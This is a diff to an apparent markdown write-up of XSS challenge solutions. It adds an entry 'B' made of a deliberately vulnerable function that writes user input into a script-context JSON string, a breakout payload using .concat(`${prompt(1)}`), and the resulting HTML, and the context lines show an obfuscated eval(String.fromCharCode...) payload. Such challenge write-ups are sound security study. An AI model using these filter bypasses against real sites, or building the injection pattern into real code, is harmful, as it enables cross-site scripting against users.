@@ -8,6 +8,7 @@
 - [2](#2)
 - [7](#7)
 - [A](#a)
+- [B](#b)
 - [C](#c)
 
 ## 0
@@ -143,6 +144,44 @@ eval(String.fromCharCode(112).concat(String.fromCharCode(114).concat(String.from
 
 ```
 <script>eval(String.fromCharCode(112).concat(String.fromCharCode(114).concat(String.fromCharCode(111).concat(String.fromCharCode(109).concat(String.fromCharCode(112).concat(String.fromCharCode(116)))))))(1)</script>
+```
+
+### B
+
+- Task
+
+```
+function escape(input) {
+    // name should not contain special characters
+    var memberName = input.replace(/[[|\s+*/\\<>&^:;=~!%-]/g, '');
+
+    // data to be parsed as JSON
+    var dataString = '{"action":"login","message":"Welcome back, ' + memberName + '."}';
+
+    // directly "parse" data in script context
+    return '                                \n\
+<script>                                    \n\
+    var data = ' + dataString + ';          \n\
+    if (data.action === "login")            \n\
+        document.write(data.message)        \n\
+</script> ';
+}    
+```
+
+- Solution
+
+```
+".concat(`${prompt(1)}`),..."
+```
+
+- HTML source
+
+```
+<script>                                    
+    var data = {"action":"login","message":"Welcome back, ".concat(`${prompt(1)}`),..."."};          
+    if (data.action === "login")            
+        document.write(data.message)        
+</script>
 ```
 
 ### C
